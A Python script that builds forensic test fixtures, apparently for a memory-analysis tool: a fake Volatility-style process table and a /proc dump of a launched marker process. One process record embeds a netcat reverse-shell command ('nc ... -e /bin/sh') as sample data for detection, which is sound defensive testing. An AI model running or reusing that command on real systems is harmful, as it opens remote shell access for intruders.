"""Build memory/crash snapshot fixtures.

Creates:
  1. A Volatility-style fake PSSCAN header + process table binary fixture
  2. A /proc-derived process dump by launching a test process
"""
from __future__ import annotations

import os
import struct
import subprocess
import sys
import time
from pathlib import Path

MAGIC = b"PSSCAN\x01\x02"
PID_TABLE_OFFSET = 64
PROC_REC_SIZE = 160


def _pack_proc(pid: int, ppid: int, name: str, cmd: str, uid: int = 0) -> bytes:
    rec = bytearray(PROC_REC_SIZE)
    struct.pack_into("<I", rec, 0, pid)
    struct.pack_into("<I", rec, 4, ppid)
    struct.pack_into("<I", rec, 8, uid)
    struct.pack_into("<Q", rec, 12, int(time.time()) - 100)  # create_time
    struct.pack_into("<I", rec, 20, 0x00000800)  # state: sleeping
    nm = name.encode()[:32]
    rec[24: 24 + len(nm)] = nm
    cm = cmd.encode()[:80]
    rec[56: 56 + len(cm)] = cm
    return bytes(rec)


def build_memory_fixture(dest: str) -> str:
    """Build a Volatility-style process scan binary fixture."""
    records = [
        _pack_proc(1, 0, "systemd", "/sbin/init", 0),
        _pack_proc(42, 1, "bash", "/bin/bash -c test", 1000),
        _pack_proc(137, 1, "sshd", "/usr/sbin/sshd -D 192.168.1.10:22", 0),
        _pack_proc(256, 42, "python3", "python3 -c 'raise SystemExit' alice@example.com", 1000),
        _pack_proc(512, 1, "nginx", "nginx: worker process 10.0.0.66:8080", 33),
        _pack_proc(999, 1, "httpd", "/usr/sbin/httpd", 0),
        _pack_proc(1001, 256, "netcat", "nc 10.0.0.1 443 -e /bin/sh", 1000),
        _pack_proc(2048, 1, "cron", "/usr/sbin/cron", 0),
    ]
    hdr = bytearray(PID_TABLE_OFFSET)
    hdr[0:8] = MAGIC
    struct.pack_into("<I", hdr, 8, len(records))
    struct.pack_into("<Q", hdr, 16, int(time.time()))
    hdr[24:31] = b"FIXTURE"

    payload = bytes(hdr) + b"".join(records)
    with open(dest, "wb") as f:
        f.write(payload)
    return dest


def build_proc_dump(dest: str) -> str:
    """Launch a marker process and dump its /proc entry."""
    marker = "forensiso_test_marker_42XYZ"
    proc = subprocess.Popen(
        [sys.executable, "-c", f"import time; open('{dest}.marker','w').write('{marker}'); time.sleep(30)"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(0.3)
    if proc.poll() is not None:
        raise RuntimeError("marker process failed to start")
    proc_path = f"/proc/{proc.pid}"
    with open(f"{proc_path}/cmdline", "rb") as f:
        cmdline = f.read().decode(errors="replace")
    with open(f"{proc_path}/status") as f:
        status = f.read()
    dump = {
        "pid": proc.pid,
        "ppid": os.getppid(),
        "cmdline": cmdline,
        "status": status,
        "exe": os.readlink(f"{proc_path}/exe"),
        "cwd": os.readlink(f"{proc_path}/cwd"),
    }
    import json
    with open(dest, "w") as f:
        json.dump(dump, f, indent=2)
    with open(f"{dest}.pid", "w") as f:
        f.write(str(proc.pid))
    return dest


def kill_marker_proc(dest: str) -> None:
    pid_file = dest + ".pid"
    if os.path.exists(pid_file):
        with open(pid_file) as f:
            pid = int(f.read().strip())
        try:
            proc = os.popen(f"kill -9 {pid} 2>/dev/null")
            proc.close()
        except (ProcessLookupError, PermissionError):
            pass
        os.unlink(pid_file)
    marker = dest + ".marker"
    if os.path.exists(marker):
        os.unlink(marker)
